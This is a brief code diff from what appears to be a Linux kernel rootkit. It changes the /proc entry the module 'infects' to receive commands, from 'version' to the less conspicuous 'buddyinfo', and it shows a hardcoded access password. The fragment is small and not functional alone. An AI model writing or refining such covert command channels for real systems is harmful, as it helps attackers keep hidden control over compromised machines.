@@ -1,5 +1,5 @@
 static char password[] = "secretpassword";
-static char passwaiter[] = "version";		/* name of /proc entry to infect
+static char passwaiter[] = "buddyinfo";		/* name of /proc entry to infect
 											 * commands will be passed to it */
 
 // module commands
